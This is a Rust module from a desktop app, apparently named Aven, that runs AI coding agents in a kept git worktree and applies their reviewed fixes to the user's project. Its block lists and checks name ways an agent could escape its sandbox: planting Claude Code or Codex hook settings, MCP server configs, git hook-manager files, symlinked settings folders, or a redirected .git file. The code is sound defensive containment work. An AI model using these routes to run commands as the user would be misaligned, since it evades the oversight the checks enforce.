//! A project's bot works in one git copy (worktree) of the project, kept
//! under the app data `bots/` directory on an `aven/bot/*` branch, never in
//! the user's folder.
//!
//! Unlike a race lane, the copy is kept between jobs, so the dependencies an
//! agent installed there (`node_modules` and other git-ignored folders)
//! survive. Before each job it is synced to what the user sees: the base is
//! the project's HEAD plus its uncommitted tracked changes (`git stash
//! create`, as a race starts from), checked out with `--force` and cleaned
//! with `git clean -fd`, never `-x`, so ignored folders stay. Reading the
//! bot's changes, applying them to the user's files and removing the copy go
//! through the race code (see `race.rs`), which never stages into the copy's
//! own index.

use std::path::{Path, PathBuf};

use serde::Serialize;
use tauri::{AppHandle, Manager};

use crate::race::{self, RaceDiff, RaceFileDiff, RaceLane};

const BRANCH_PREFIX: &str = "aven/bot/";
const WHO: &str = "A bot";

#[derive(Debug, Serialize, Clone, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct BotCopy {
    pub path: String,
    pub branch: String,
    /// The project's repository root.
    pub root: String,
    /// The repository's shared git folder (usually `<root>/.git`): the copy
    /// shares its branches and other refs with the user's checkout.
    pub git_dir: String,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BotSync {
    pub root: String,
    /// The commit the copy now matches.
    pub base: String,
    /// The base includes the project's uncommitted changes.
    pub uncommitted: bool,
    /// Untracked project files exist; the copy does not have them.
    pub untracked: bool,
    /// Settings files an agent had left in the copy, now removed (see
    /// `PLANTED`).
    pub planted: Vec<String>,
}

/// What the bot changed, and a fingerprint of exactly those changes: the
/// fix the user reviews is the fix that is applied (see `apply`).
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BotDiff {
    #[serde(flatten)]
    pub changes: RaceDiff,
    pub hash: String,
}

/// A branch Aven made for a bot: `aven/bot/` and a short lowercase slug.
fn valid_branch(branch: &str) -> bool {
    branch.strip_prefix(BRANCH_PREFIX).is_some_and(|slug| {
        !slug.is_empty()
            && slug.len() <= 48
            && !slug.starts_with('-')
            && !slug.ends_with('-')
            && slug
                .bytes()
                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
    })
}

/// FNV-1a: a stable, dependency-free name for a project's copy folder.
fn fnv1a(text: &str) -> u64 {
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for byte in text.as_bytes() {
        hash ^= u64::from(*byte);
        hash = hash.wrapping_mul(0x0100_0000_01b3);
    }
    hash
}

/// The copy's folder name: the project's folder name, made safe, and a hash
/// of its key, so two projects with one name get two copies.
fn copy_dir_name(key: &str) -> String {
    let key = match key.trim_end_matches(['/', '\\']) {
        "" => key,
        trimmed => trimmed,
    };
    let base = key.rsplit(['/', '\\']).next().unwrap_or("");
    let mut slug: String = base
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect::<String>()
        .split('-')
        .filter(|part| !part.is_empty())
        .collect::<Vec<_>>()
        .join("-");
    slug.truncate(32);
    let slug = slug.trim_end_matches('-');
    let hash = fnv1a(key);
    if slug.is_empty() {
        format!("project-{hash:016x}")
    } else {
        format!("{slug}-{hash:016x}")
    }
}

fn same_path(a: &Path, b: &Path) -> bool {
    let canonical = |path: &Path| std::fs::canonicalize(path).unwrap_or_else(|_| path.into());
    canonical(a) == canonical(b)
}

/// Whether git lists `path` among the repository's worktrees.
fn registered_worktree(root: &Path, path: &Path) -> bool {
    let Ok(listing) = race::run(root, &["worktree", "list", "--porcelain"]) else {
        return false;
    };
    String::from_utf8_lossy(&listing)
        .lines()
        .filter_map(|line| line.strip_prefix("worktree "))
        .any(|listed| same_path(Path::new(listed), path))
}

/// A bot's copy: a folder directly inside `bots`, and (when it exists) the
/// top of its own git checkout, so git never acts on a repository above it.
fn copy_path(bots: &Path, value: &str) -> Result<PathBuf, String> {
    let path = race::lane_path(bots, value)?;
    if path.parent() != Some(bots) {
        return Err("Not one of Aven's copies".into());
    }
    Ok(path)
}

const MISSING_COPY: &str = "The bot's copy is missing. Turn the bot off and on again.";
const FOREIGN_COPY: &str =
    "The bot's copy no longer points at this project's repository, so Aven didn't touch it. Turn the bot off and on again.";

/// Where Aven notes which repository a copy belongs to: beside the copy, in
/// the folder that holds the copies, which no agent can write.
fn repository_note(bots: &Path, copy: &Path) -> PathBuf {
    let name = copy
        .file_name()
        .map(|name| name.to_string_lossy().to_string())
        .unwrap_or_default();
    bots.join(format!(".{name}.gitdir"))
}

fn canonical(path: &Path) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.into())
}

/// The repository folder a copy's `.git` file names, from the file alone
/// (no git run): it must be a plain file reading `gitdir: <repo>/worktrees/<name>`.
fn copy_repository(copy: &Path) -> Option<PathBuf> {
    let dot_git = copy.join(".git");
    let meta = std::fs::symlink_metadata(&dot_git).ok()?;
    if !meta.is_file() {
        return None;
    }
    let text = std::fs::read_to_string(&dot_git).ok()?;
    let target = text.trim().strip_prefix("gitdir:")?.trim();
    let target = if Path::new(target).is_absolute() {
        PathBuf::from(target)
    } else {
        copy.join(target)
    };
    let worktrees = target.parent()?;
    if worktrees.file_name()? != "worktrees" {
        return None;
    }
    Some(canonical(worktrees.parent()?))
}

/// Refuse a copy that is not a git checkout of its own (its `.git` file was
/// lost, say), or whose `.git` file was pointed at another repository: git
/// would otherwise act on a repository further up, or run what a planted
/// repository's configuration names. A copy belongs to the repository Aven
/// noted when it made it.
fn checked_copy(bots: &Path, value: &str) -> Result<PathBuf, String> {
    let path = copy_path(bots, value)?;
    let repository = copy_repository(&path).ok_or_else(|| MISSING_COPY.to_string())?;
    let note = repository_note(bots, &path);
    match std::fs::read_to_string(&note) {
        Ok(noted) => {
            if canonical(Path::new(noted.trim())) != repository {
                return Err(FOREIGN_COPY.into());
            }
        }
        Err(_) => {
            // A copy from before notes: it may not point anywhere an agent
            // can write (its copy, the folder of copies, a temp folder).
            let temp = canonical(&std::env::temp_dir());
            if repository.starts_with(canonical(bots))
                || repository.starts_with(&temp)
                || repository.starts_with("/tmp")
                || repository.starts_with("/private/tmp")
            {
                return Err(FOREIGN_COPY.into());
            }
            std::fs::write(&note, repository.to_string_lossy().as_bytes())
                .map_err(|e| format!("Could not check the bot's copy: {e}"))?;
        }
    }
    let common = race::text(
        race::run(&path, &["rev-parse", "--git-common-dir"])
            .map_err(|_| MISSING_COPY.to_string())?,
    );
    let common = if Path::new(&common).is_absolute() {
        PathBuf::from(&common)
    } else {
        path.join(&common)
    };
    if canonical(&common) != repository {
        return Err(FOREIGN_COPY.into());
    }
    let top = race::text(
        race::run(&path, &["rev-parse", "--show-toplevel"])
            .map_err(|_| MISSING_COPY.to_string())?,
    );
    if !same_path(Path::new(&top), &path) {
        return Err(MISSING_COPY.into());
    }
    Ok(path)
}

/// Settings files an app would load from a copy and run as the user: Claude
/// Code's project and local settings (hooks), and a project's MCP servers.
/// Aven never lets one an agent wrote stay: a sync removes them, and a turn
/// does not start while one is there (see `planted`).
const PLANTED: &[&str] = &[
    ".claude/settings.json",
    ".claude/settings.local.json",
    ".mcp.json",
    // Codex's project layer (a copy of a trusted repository is trusted too)
    // and its hooks.
    ".codex/config.toml",
    ".codex/hooks.json",
];

/// Folders and files at the top of a copy that an app reads as settings. A
/// link there could point anywhere, so a turn never starts while one is a
/// link; the copy's sandbox and rules keep agents from writing them.
const SETTINGS_ROOTS: &[&str] = &[".claude", ".codex", ".agents", ".vscode", ".mcp.json"];

/// Paths a fix may not bring into your files: settings an app would run as
/// you, and the folders git hook managers run from. Matched without case.
const PROTECTED: &[&str] = &[
    ".claude",
    ".codex",
    ".agents",
    ".vscode",
    ".mcp.json",
    ".husky",
    ".githooks",
    ".git-hooks",
    ".lefthook",
    "lefthook.yml",
    ".lefthook.yml",
    ".pre-commit-config.yaml",
];

/// The protected paths among a fix's files (see `PROTECTED`).
fn protected_paths(paths: &[&str]) -> Vec<String> {
    paths
        .iter()
        .filter(|path| {
            let lower = path.replace('\\', "/").to_lowercase();
            let first = lower.split('/').next().unwrap_or("");
            PROTECTED.contains(&first)
        })
        .map(|path| (*path).to_string())
        .collect()
}

/// A settings folder or file at the top of the copy that is a link.
fn linked_settings(copy: &Path) -> Option<String> {
    let entries = std::fs::read_dir(copy).ok()?;
    entries.flatten().find_map(|entry| {
        let name = entry.file_name().to_string_lossy().to_string();
        let settings = SETTINGS_ROOTS.contains(&name.to_lowercase().as_str());
        let link = entry.file_type().is_ok_and(|kind| kind.is_symlink());
        (settings && link).then_some(name)
    })
}

/// The settings files in the copy that are not the project's own as
/// committed: new, ignored or changed. With `remove`, they are removed (a
/// changed one goes back to the copy's commit).
pub fn planted(bots: &Path, copy: &str, remove: bool) -> Result<Vec<String>, String> {
    let copy = checked_copy(bots, copy)?;
    clear_planted(&copy, remove)
}

fn clear_planted(copy: &Path, remove: bool) -> Result<Vec<String>, String> {
    if let Some(name) = linked_settings(copy) {
        return Err(format!(
            "{name} in the bot's copy is a link, which could point at settings outside it, so Aven didn't start the turn. Remove it from the copy, or turn the bot off and on again."
        ));
    }
    let mut args = vec![
        "status".to_string(),
        "--porcelain=v1".to_string(),
        "-z".to_string(),
        "--ignored=matching".to_string(),
        "--untracked-files=all".to_string(),
        "--no-renames".to_string(),
        "--".to_string(),
    ];
    // Without case: a file system that ignores case loads `.Claude` too.
    args.extend(PLANTED.iter().map(|path| format!(":(icase){path}")));
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let listing = race::run(copy, &args)?;
    let mut found = Vec::new();
    for entry in listing.split(|byte| *byte == 0) {
        if entry.len() < 4 {
            continue;
        }
        let code = String::from_utf8_lossy(&entry[..2]).to_string();
        let path = String::from_utf8_lossy(&entry[3..]).to_string();
        if !PLANTED.contains(&path.to_lowercase().as_str()) {
            continue;
        }
        if remove {
            if code == "??" || code == "!!" {
                let _ = std::fs::remove_file(copy.join(&path));
            } else {
                race::run(copy, &["checkout", "--force", "HEAD", "--", &path])
                    .map_err(|e| format!("Could not tidy the bot's copy: {e}"))?;
            }
        }
        found.push(path);
    }
    Ok(found)
}

fn repo_root(cwd: &Path) -> Result<PathBuf, String> {
    let root = race::text(
        race::run(cwd, &["rev-parse", "--show-toplevel"])
            .map_err(|_| format!("{WHO} needs a git repository."))?,
    );
    let root = PathBuf::from(root);
    race::run(&root, &["rev-parse", "--verify", "HEAD"])
        .map_err(|_| format!("{WHO} needs at least one commit in this repository."))?;
    Ok(root)
}

/// The bot's copy of the project at `cwd`, made when missing (or when git
/// no longer knows the folder). An existing copy is left exactly as it is.
pub fn ensure_copy(cwd: &Path, bots: &Path, key: &str, branch: &str) -> Result<BotCopy, String> {
    if key.trim().is_empty() || key.len() > 4096 || !valid_branch(branch) {
        return Err("Invalid bot request".into());
    }
    let root = repo_root(cwd)?;
    let path = bots.join(copy_dir_name(key));
    let path_text = path.to_string_lossy().to_string();
    let common = PathBuf::from(race::text(race::run(
        &root,
        &["rev-parse", "--git-common-dir"],
    )?));
    let git_dir = if common.is_absolute() {
        common
    } else {
        root.join(common)
    };
    let copy = BotCopy {
        path: path_text.clone(),
        branch: branch.to_string(),
        root: root.to_string_lossy().to_string(),
        git_dir: git_dir.to_string_lossy().to_string(),
    };
    let note = repository_note(bots, &path);
    if path.is_dir() && registered_worktree(&root, &path) {
        if !note.exists() {
            std::fs::write(&note, canonical(&git_dir).to_string_lossy().as_bytes())
                .map_err(|e| format!("Could not create the bot's copy: {e}"))?;
        }
        return Ok(copy);
    }
    // A folder git forgot (the project moved, a prune) is made again.
    if path.exists() {
        std::fs::remove_dir_all(&path)
            .map_err(|e| format!("Could not replace the bot's old copy: {e}"))?;
    }
    let _ = race::run(&root, &["worktree", "prune"]);
    std::fs::create_dir_all(bots).map_err(|e| format!("Could not create the bot's copy: {e}"))?;
    race::run(
        &root,
        &[
            "worktree", "add", "--quiet", "-B", branch, &path_text, "HEAD",
        ],
    )
    .map_err(|e| format!("Could not create the bot's copy: {e}"))?;
    std::fs::write(&note, canonical(&git_dir).to_string_lossy().as_bytes())
        .map_err(|e| format!("Could not create the bot's copy: {e}"))?;
    Ok(copy)
}

/// Bring the copy to the user's current state. Tracked files match the base
/// exactly; untracked files that git does not ignore are removed; ignored
/// folders such as installed dependencies stay.
pub fn sync(cwd: &Path, bots: &Path, copy: &str, branch: &str) -> Result<BotSync, String> {
    if !valid_branch(branch) {
        return Err("Invalid bot request".into());
    }
    let copy = checked_copy(bots, copy)?;
    let base = race::prepare_for(cwd, WHO)?;
    reset_to(&copy, &base.base, branch)?;
    // Ignored settings files survive `git clean -fd`: removed by name.
    let planted = clear_planted(&copy, true)?;
    Ok(BotSync {
        root: base.root,
        base: base.base,
        uncommitted: base.uncommitted,
        untracked: base.untracked,
        planted,
    })
}

fn reset_to(copy: &Path, base: &str, branch: &str) -> Result<(), String> {
    if !race::is_sha(base) {
        return Err("Invalid bot base".into());
    }
    // The project's own hooks (post-checkout and the like) are not run for
    // Aven's bookkeeping in the copy.
    race::run(
        copy,
        &[
            "-c",
            "core.hooksPath=/dev/null",
            "checkout",
            "--quiet",
            "--force",
            "-B",
            branch,
            base,
        ],
    )
    .map_err(|e| format!("Could not update the bot's copy: {e}"))?;
    race::run(copy, &["clean", "-f", "-d", "--quiet"])
        .map_err(|e| format!("Could not tidy the bot's copy: {e}"))?;
    Ok(())
}

/// Throw the bot's changes away: the copy goes back to `base`.
pub fn discard(bots: &Path, copy: &str, base: &str, branch: &str) -> Result<(), String> {
    if !valid_branch(branch) {
        return Err("Invalid bot request".into());
    }
    reset_to(&checked_copy(bots, copy)?, base, branch)
}

fn patch_hash(patch: &[u8]) -> String {
    let mut hash: u64 = 0xcbf29ce484222325;
    for byte in patch {
        hash ^= u64::from(*byte);
        hash = hash.wrapping_mul(0x100000001b3);
    }
    format!("{hash:016x}-{}", patch.len())
}

/// What the bot changed in its copy since `base`.
pub fn diff(bots: &Path, copy: &str, base: &str) -> Result<BotDiff, String> {
    let worktree = checked_copy(bots, copy)?;
    let changes = race::diff(&worktree, base)?;
    let hash = patch_hash(&race::patch(&worktree, base)?);
    Ok(BotDiff { changes, hash })
}

pub fn file_diff(bots: &Path, copy: &str, base: &str, path: &str) -> Result<RaceFileDiff, String> {
    race::file_diff(&checked_copy(bots, copy)?, base, path)
}

/// Apply what the bot changed onto the user's working tree, only when it is
/// exactly the fix the user reviewed (`hash`, from `diff`). The patch is
/// checked first, so a conflict changes nothing and the fix stays in the
/// copy.
pub fn apply(
    cwd: &Path,
    bots: &Path,
    copy: &str,
    base: &str,
    hash: &str,
) -> Result<RaceDiff, String> {
    let root = repo_root(cwd)?;
    let worktree = checked_copy(bots, copy)?;
    let changes = race::diff(&worktree, base)?;
    if changes.files.is_empty() {
        return Err("The bot's copy has no changes to apply.".into());
    }
    let patch = race::patch(&worktree, base)?;
    if patch_hash(&patch) != hash {
        return Err(FIX_CHANGED.into());
    }
    // Settings an app would run as you, or a hook manager's folder, never
    // come into your files this way: you can take them over in a chat.
    let paths: Vec<&str> = changes
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    let protected = protected_paths(&paths);
    if !protected.is_empty() {
        return Err(format!(
            "{PROTECTED_FIX} {}. Take it over in a chat to apply that part yourself.",
            protected.join(", ")
        ));
    }
    race::apply_patch(&root, &patch)?;
    Ok(changes)
}

/// The start of Apply's refusal of a fix that touches protected paths.
const PROTECTED_FIX: &str =
    "Aven didn't apply this fix: it changes settings or hooks that could run commands as you:";

/// Said when the copy no longer holds the fix the user reviewed.
const FIX_CHANGED: &str = "The fix changed since you looked.";

// ---------------------------------------------------------------------------
// A crew's stack: each card that passed its checks is a commit on the crew's
// branch in its copy, and the next card builds on top. The user's folder
// changes only through `apply_range`, by exactly the reviewed range.

fn head(copy: &Path) -> Result<String, String> {
    let head = race::text(race::run(copy, &["rev-parse", "--verify", "HEAD"])?);
    if race::is_sha(&head) {
        Ok(head)
    } else {
        Err("The crew's copy has no commit to build on.".into())
    }
}

/// Make `sha` the branch's commit, with the copy's index to match. The files
/// in the copy are left as they are (they are what `sha` holds).
fn move_branch(copy: &Path, branch: &str, sha: &str, old: &str) -> Result<(), String> {
    race::run(
        copy,
        &["update-ref", &format!("refs/heads/{branch}"), sha, old],
    )?;
    race::run(copy, &["reset", "--quiet"])?;
    Ok(())
}

/// Stack what the copy holds now as a commit on the branch, on top of
/// `parent`, which must be the branch's commit (the card's starting point).
/// Returns the new commit.
pub fn stack(
    bots: &Path,
    copy: &str,
    branch: &str,
    parent: &str,
    message: &str,
) -> Result<String, String> {
    if !valid_branch(branch) || !race::is_sha(parent) {
        return Err("Invalid bot request".into());
    }
    let copy = checked_copy(bots, copy)?;
    let current = head(&copy)?;
    if current != parent {
        return Err(STACK_MOVED.into());
    }
    let message: String = message.chars().take(200).collect();
    let sha = race::snapshot(&copy, parent, &format!("Crew: {message}"))?;
    move_branch(&copy, branch, &sha, &current)?;
    Ok(sha)
}

/// Said when the crew's copy is not on the commit Aven left it at.
const STACK_MOVED: &str = "The crew's copy moved since its last card.";

/// Whether `from` is `to` or an ancestor of it.
fn reaches(copy: &Path, from: &str, to: &str) -> bool {
    from == to || race::run(copy, &["merge-base", "--is-ancestor", from, to]).is_ok()
}

/// What changed between two of the copy's commits, and its fingerprint.
pub fn range(bots: &Path, copy: &str, from: &str, to: &str) -> Result<BotDiff, String> {
    let copy = checked_copy(bots, copy)?;
    if !race::is_sha(from) || !race::is_sha(to) || !reaches(&copy, from, to) {
        return Err("Invalid bot range".into());
    }
    let changes = race::range_diff(&copy, from, to)?;
    let hash = patch_hash(&race::range_patch(&copy, from, to)?);
    Ok(BotDiff { changes, hash })
}

pub fn range_file_diff(
    bots: &Path,
    copy: &str,
    from: &str,
    to: &str,
    path: &str,
) -> Result<RaceFileDiff, String> {
    race::range_file_diff(&checked_copy(bots, copy)?, from, to, path)
}

/// Apply the stacked range `from..to` onto the user's working tree, only
/// when it is exactly the change the user reviewed (`hash`, from `range`),
/// never touching protected paths, and checked first so a conflict changes
/// nothing. The copy and its branch are left as they are.
pub fn apply_range(
    cwd: &Path,
    bots: &Path,
    copy: &str,
    from: &str,
    to: &str,
    hash: &str,
) -> Result<RaceDiff, String> {
    let root = repo_root(cwd)?;
    let worktree = checked_copy(bots, copy)?;
    if !race::is_sha(from) || !race::is_sha(to) || !reaches(&worktree, from, to) {
        return Err("Invalid bot range".into());
    }
    let changes = race::range_diff(&worktree, from, to)?;
    if changes.files.is_empty() {
        return Err("The crew's branch has no changes to apply.".into());
    }
    let patch = race::range_patch(&worktree, from, to)?;
    if patch_hash(&patch) != hash {
        return Err(FIX_CHANGED.into());
    }
    let paths: Vec<&str> = changes
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    let protected = protected_paths(&paths);
    if !protected.is_empty() {
        return Err(format!(
            "{PROTECTED_FIX} {}. Take it over in a chat to apply that part yourself.",
            protected.join(", ")
        ));
    }
    race::apply_patch(&root, &patch)?;
    Ok(changes)
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BotRestack {
    /// The user's state the stack now starts from.
    pub base: String,
    /// Each stacked card's commit, replayed on top of `base`, in order.
    pub commits: Vec<String>,
}

/// Replay the stacked cards (`commits`, in order, the first on top of
/// `from`) onto the user's current state, one card at a time, each its own
/// commit again. Nothing else may be in the copy (a card at work there
/// stops this). If any card no longer fits, the copy and its branch go back
/// to exactly where they were and nothing is lost.
pub fn restack(
    cwd: &Path,
    bots: &Path,
    copy: &str,
    branch: &str,
    from: &str,
    commits: &[String],
) -> Result<BotRestack, String> {
    if !valid_branch(branch)
        || !race::is_sha(from)
        || commits.is_empty()
        || commits.len() > 200
        || !commits.iter().all(|sha| race::is_sha(sha))
    {
        return Err("Invalid bot request".into());
    }
    let worktree = checked_copy(bots, copy)?;
    let old = head(&worktree)?;
    if commits.last() != Some(&old) {
        return Err(STACK_MOVED.into());
    }
    if !race::diff(&worktree, &old)?.files.is_empty() {
        return Err("The crew is working in its copy. Restack once its card is done.".into());
    }
    let mut previous = from.to_string();
    let mut patches = Vec::with_capacity(commits.len());
    for sha in commits {
        if !reaches(&worktree, &previous, sha) {
            return Err("Invalid bot range".into());
        }
        patches.push(race::range_patch(&worktree, &previous, sha)?);
        previous = sha.clone();
    }
    let base = race::prepare_for(cwd, WHO)?.base;
    let messages: Vec<String> = commits
        .iter()
        .map(|sha| {
            race::text(race::run(&worktree, &["log", "-1", "--format=%B", sha]).unwrap_or_default())
        })
        .collect();
    reset_to(&worktree, &base, branch)?;
    let mut replayed = Vec::with_capacity(commits.len());
    let mut parent = base.clone();
    for (index, patch) in patches.iter().enumerate() {
        let step = (|| {
            if !patch.is_empty() {
                race::apply_patch(&worktree, patch)?;
            }
            let message = if messages[index].is_empty() {
                "Crew: a card"
            } else {
                messages[index].as_str()
            };
            let sha = race::snapshot(&worktree, &parent, message)?;
            move_branch(&worktree, branch, &sha, &parent)?;
            Ok::<String, String>(sha)
        })();
        match step {
            Ok(sha) => {
                parent = sha.clone();
                replayed.push(sha);
            }
            Err(error) => {
                // Never lose work: back to exactly the stack as it was.
                reset_to(&worktree, &old, branch)?;
                return Err(format!(
                    "{RESTACK_CONFLICT} (card {} of {}): {error}",
                    index + 1,
                    commits.len()
                ));
            }
        }
    }
    Ok(BotRestack {
        base,
        commits: replayed,
    })
}

/// The start of a restack's refusal when a card no longer fits.
const RESTACK_CONFLICT: &str = "Your files changed where the crew worked";

/// Remove the copy and its branch.
pub fn remove(cwd: &Path, bots: &Path, copy: &str, branch: &str) -> Result<(), String> {
    if !valid_branch(branch) {
        return Err("Invalid bot request".into());
    }
    let path = copy_path(bots, copy)?;
    // A deleted or moved project folder still has its copy removed, without
    // git, which would otherwise act on whatever repository is above it.
    let Ok(root) = repo_root(cwd) else {
        if path.exists() {
            std::fs::remove_dir_all(&path)
                .map_err(|e| format!("Could not remove the bot's copy: {e}"))?;
        }
        return Ok(());
    };
    race::remove_copies(
        &root,
        bots,
        BRANCH_PREFIX,
        &[RaceLane {
            path: copy.to_string(),
            branch: branch.to_string(),
        }],
    )
}

fn bots_dir(app: &AppHandle) -> Result<PathBuf, String> {
    Ok(app
        .path()
        .app_data_dir()
        .map_err(|e| e.to_string())?
        .join("bots"))
}

async fn blocking<T: Send + 'static>(
    work: impl FnOnce() -> Result<T, String> + Send + 'static,
) -> Result<T, String> {
    tauri::async_runtime::spawn_blocking(work)
        .await
        .map_err(|e| e.to_string())?
}

/// Whether a folder can have a bot: a git repository with a commit. Says
/// why not, in the same words turning a bot on would; a folder that is gone
/// says so, rather than that it needs Git.
#[tauri::command]
pub async fn bot_project_ready(cwd: String) -> Result<(), String> {
    blocking(move || project_ready(&crate::fs::expand_home(&cwd))).await
}

fn project_ready(cwd: &Path) -> Result<(), String> {
    if !cwd.is_dir() {
        return Err(MISSING_PROJECT.into());
    }
    repo_root(cwd).map(|_| ())
}

const MISSING_PROJECT: &str = "This project's folder is missing.";

#[tauri::command]
pub async fn bot_copy_prepare(
    app: AppHandle,
    cwd: String,
    key: String,
    branch: String,
) -> Result<BotCopy, String> {
    let bots = bots_dir(&app)?;
    blocking(move || ensure_copy(&crate::fs::expand_home(&cwd), &bots, &key, &branch)).await
}

#[tauri::command]
pub async fn bot_copy_sync(
    app: AppHandle,
    cwd: String,
    copy: String,
    branch: String,
) -> Result<BotSync, String> {
    let bots = bots_dir(&app)?;
    blocking(move || sync(&crate::fs::expand_home(&cwd), &bots, &copy, &branch)).await
}

/// Settings files an agent left in the copy (see `PLANTED`); with `remove`,
/// they are removed.
#[tauri::command]
pub async fn bot_copy_planted(
    app: AppHandle,
    copy: String,
    remove: bool,
) -> Result<Vec<String>, String> {
    let bots = bots_dir(&app)?;
    blocking(move || planted(&bots, &copy, remove)).await
}

#[tauri::command]
pub async fn bot_copy_diff(app: AppHandle, copy: String, base: String) -> Result<BotDiff, String> {
    let bots = bots_dir(&app)?;
    blocking(move || diff(&bots, &copy, &base)).await
}

#[tauri::command]
pub async fn bot_copy_file_diff(
    app: AppHandle,
    copy: String,
    base: String,
    path: String,
) -> Result<RaceFileDiff, String> {
    let bots = bots_dir(&app)?;
    blocking(move || file_diff(&bots, &copy, &base, &path)).await
}

#[tauri::command]
pub async fn bot_copy_apply(
    app: AppHandle,
    cwd: String,
    copy: String,
    base: String,
    hash: String,
) -> Result<RaceDiff, String> {
    let bots = bots_dir(&app)?;
    blocking(move || apply(&crate::fs::expand_home(&cwd), &bots, &copy, &base, &hash)).await
}

#[tauri::command]
pub async fn bot_copy_discard(
    app: AppHandle,
    copy: String,
    base: String,
    branch: String,
) -> Result<(), String> {
    let bots = bots_dir(&app)?;
    blocking(move || discard(&bots, &copy, &base, &branch)).await
}

#[tauri::command]
pub async fn bot_copy_stack(
    app: AppHandle,
    copy: String,
    branch: String,
    parent: String,
    message: String,
) -> Result<String, String> {
    let bots = bots_dir(&app)?;
    blocking(move || stack(&bots, &copy, &branch, &parent, &message)).await
}

#[tauri::command]
pub async fn bot_copy_range(
    app: AppHandle,
    copy: String,
    from: String,
    to: String,
) -> Result<BotDiff, String> {
    let bots = bots_dir(&app)?;
    blocking(move || range(&bots, &copy, &from, &to)).await
}

#[tauri::command]
pub async fn bot_copy_range_file_diff(
    app: AppHandle,
    copy: String,
    from: String,
    to: String,
    path: String,
) -> Result<RaceFileDiff, String> {
    let bots = bots_dir(&app)?;
    blocking(move || range_file_diff(&bots, &copy, &from, &to, &path)).await
}

#[tauri::command]
pub async fn bot_copy_apply_range(
    app: AppHandle,
    cwd: String,
    copy: String,
    from: String,
    to: String,
    hash: String,
) -> Result<RaceDiff, String> {
    let bots = bots_dir(&app)?;
    blocking(move || {
        apply_range(
            &crate::fs::expand_home(&cwd),
            &bots,
            &copy,
            &from,
            &to,
            &hash,
        )
    })
    .await
}

#[tauri::command]
pub async fn bot_copy_restack(
    app: AppHandle,
    cwd: String,
    copy: String,
    branch: String,
    from: String,
    commits: Vec<String>,
) -> Result<BotRestack, String> {
    let bots = bots_dir(&app)?;
    blocking(move || {
        restack(
            &crate::fs::expand_home(&cwd),
            &bots,
            &copy,
            &branch,
            &from,
            &commits,
        )
    })
    .await
}

#[tauri::command]
pub async fn bot_copy_remove(
    app: AppHandle,
    cwd: String,
    copy: String,
    branch: String,
) -> Result<(), String> {
    let bots = bots_dir(&app)?;
    blocking(move || remove(&crate::fs::expand_home(&cwd), &bots, &copy, &branch)).await
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(name: &str) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("aven-bot-test-{name}-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        // Canonical, so paths git reports compare equal on macOS (/private/var).
        std::fs::canonicalize(&dir).unwrap()
    }

    #[cfg_attr(windows, allow(dead_code))]
    fn git_ok(dir: &Path, args: &[&str]) {
        race::run(dir, args).unwrap_or_else(|e| panic!("git {args:?}: {e}"));
    }

    #[cfg_attr(windows, allow(dead_code))]
    fn read(path: &Path) -> String {
        std::fs::read_to_string(path).unwrap()
    }

    #[cfg_attr(windows, allow(dead_code))]
    fn repo() -> PathBuf {
        let root = temp_dir("repo");
        git_ok(&root, &["init", "-q", "-b", "main"]);
        git_ok(&root, &["config", "user.email", "test@example.com"]);
        git_ok(&root, &["config", "user.name", "Test"]);
        git_ok(&root, &["config", "core.autocrlf", "false"]);
        git_ok(&root, &["config", "commit.gpgsign", "false"]);
        std::fs::write(root.join(".gitignore"), "node_modules/\n").unwrap();
        std::fs::write(root.join("a.txt"), "one\ntwo\n").unwrap();
        std::fs::write(root.join("b.txt"), "keep\n").unwrap();
        git_ok(&root, &["add", "-A"]);
        git_ok(&root, &["commit", "-q", "-m", "init"]);
        root
    }

    const BRANCH: &str = "aven/bot/jelly";

    // Bots are not offered on Windows (Claude Code's sandbox does not run
    // there), and these drive real worktrees through canonical macOS paths.
    #[cfg(not(windows))]
    #[test]
    fn keeps_one_copy_synced_to_what_the_user_sees() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        assert!(copy_path.starts_with(&bots));
        assert_eq!(copy.branch, BRANCH);
        assert_eq!(PathBuf::from(&copy.git_dir), root.join(".git"));
        assert_eq!(read(&copy_path.join("a.txt")), "one\ntwo\n");

        // The bot installed dependencies and left a stray file and an edit.
        std::fs::create_dir_all(copy_path.join("node_modules/pkg")).unwrap();
        std::fs::write(copy_path.join("node_modules/pkg/index.js"), "x\n").unwrap();
        std::fs::write(copy_path.join("stray.txt"), "old job\n").unwrap();
        std::fs::write(copy_path.join("b.txt"), "bot edit\n").unwrap();
        // Asking again keeps the same copy, untouched.
        assert_eq!(ensure_copy(&root, &bots, &key, BRANCH).unwrap(), copy);
        assert_eq!(read(&copy_path.join("b.txt")), "bot edit\n");

        // The user has uncommitted work; the copy starts from it. Their own
        // git is busy meanwhile (its index is locked): the sync never needs
        // that lock, and leaves it alone.
        std::fs::write(root.join("a.txt"), "one\ntwo\nmine\n").unwrap();
        let lock = root.join(".git/index.lock");
        std::fs::write(&lock, "").unwrap();
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
        assert!(lock.is_file());
        std::fs::remove_file(&lock).unwrap();
        assert!(synced.uncommitted);
        assert_eq!(read(&copy_path.join("a.txt")), "one\ntwo\nmine\n");
        assert_eq!(read(&copy_path.join("b.txt")), "keep\n");
        assert!(!copy_path.join("stray.txt").exists());
        // Installed dependencies survive the sync.
        assert!(copy_path.join("node_modules/pkg/index.js").is_file());
        assert!(diff(&bots, &copy.path, &synced.base)
            .unwrap()
            .changes
            .files
            .is_empty());
